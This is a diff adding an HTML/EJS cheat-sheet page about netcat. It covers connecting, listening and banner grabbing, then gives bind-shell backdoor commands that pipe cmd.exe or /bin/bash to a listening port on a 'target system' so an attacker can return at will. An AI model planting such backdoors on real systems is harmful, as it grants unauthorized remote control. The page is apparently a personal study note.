@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<!--  This site was created in Webflow. http://www.webflow.com  -->
+<!--  Last Published: Mon Apr 22 2019 15:55:05 GMT+0000 (UTC)  -->
+<html data-wf-page="5cbdc332ef4522126b929060" data-wf-site="5ca985147177dc87e3d2f4c6">
+<head>
+  <meta charset="utf-8">
+  <title>Commands-sheat</title>
+  <meta content="Incredible is a template, that combines a minimal modern design with the right amount of features to help you create an outstanding web for your business in no time." name="description">
+  <meta content="Commands-sheat" property="og:title">
+  <meta content="width=device-width, initial-scale=1" name="viewport">
+  <meta content="Webflow" name="generator">
+  
+   <% include ../../partials/header.ejs %>
+   
+</head>
+<body class="natbody">
+	
+   <% include ../../partials/nav.ejs %>
+   
+  <div class="w-row">
+    <div class="w-col w-col-3">
+      <h1 class="heading-25">Menu:</h1>
+      <ul>
+        <% include ../../partials/codemmandsmenu.ejs %>
+      </ul>
+    </div>
+    <div class="column-12 w-col w-col-9">
+      <h1 class="heading-26">Netcat</h1>
+	  <div class="text-block-18">Netcat is cool, netcat is great, netcat is happiness, netcat exists, netcat why didn't I learned about it earlier?</div>
+	  
+	  <div style="margin-bottom: 55px;" id="spacer"></div>
+	  
+      <div class="code-snippet">
+        <h1 class="codecomment">//To connect to another machine:</h1>
+       <p class="paragraph-8">nc options host-IP-address port<br>
+		   example:</br>
+	   nc 192.168.1.105 80</p>
+	   <p class="comments"> The machine you want to connect to has to be listenning for inbound connections in the port specified</p>
+      </div>
+	  
+	  
+      <div class="code-snippet">
+        <h1 class="codecomment">//To listen for inbound connections:</h1>
+        <p class="paragraph-8">
+			nc -l -p port
+		</p>
+      </div>
+	 	  
+	  
+      <div class="code-snippet">
+        <h1 class="codecomment">//A banner grab to the web server can be done with:</h1>
+        <p class="paragraph-8">HEAD / HTTP/1.0 </br>
+			Usually works after two enters</p>
+      </div>
+	  
+	  
+      <div class="code-snippet">
+        <h1 class="codecomment">//Create a Backdoor on a target system so we can come back whenever we want.</h1>
+		<h1 class="codecomment">//WINDOWS:</h1>
+        <p class="paragraph-8">nc -l -p 6996 -e cmd.exe</br>
+		</p>
+      </div>
+	  
+      <div class="code-snippet">
+		<h1 class="codecomment">// Linux || Unix (MAC):</h1>
+        <p class="paragraph-8">
+			6996 == PORT NUMBER YOU WANT TO USE </br>
+			nc -l -p 6996 -e /bin/bash || nc -l -p 6996 -e /bin/sh</br>
+			</br>
+	<p class="comments">This will open a listener on the system that will "pipe" the command shell or the Linux bash shell to the connecting system.</p>
+		</p>
+      </div>
+	  
+        <div class="code-snippet">
+  		<h1 class="codecomment">//On our attacking system, we type the following:</h1>
+          <p class="paragraph-8">
+  			nc host-IP-address port
+
+  	<p class="comments">Now the shell has been piped through our Netcat connection directly to our attacking system. It's all yours.</p>
+  		</p>
+        </div>
+	  
+     
+	  
+	  
+	  
+	  
+	  
+	  
+	  
+    </div>
+  </div>
+  <div class="footer-cheatsheet">
+    <h1 class="heading-27">Code-CheatSheet</h1>
+  </div>
+  <script src="https://d1tdp7z6w94jbb.cloudfront.net/js/jquery-3.3.1.min.js" type="text/javascript" integrity="sha256-FgpCb/KJQlLNfOu91ta32o/NMZxltwRo8QtmkMRdAu8=" crossorigin="anonymous"></script>
+  <script src="js/webflow.js" type="text/javascript"></script>
+  <!-- [if lte IE 9]><script src="https://cdnjs.cloudflare.com/ajax/libs/placeholders/3.0.2/placeholders.min.js"></script><![endif] -->
+</body>
+</html>
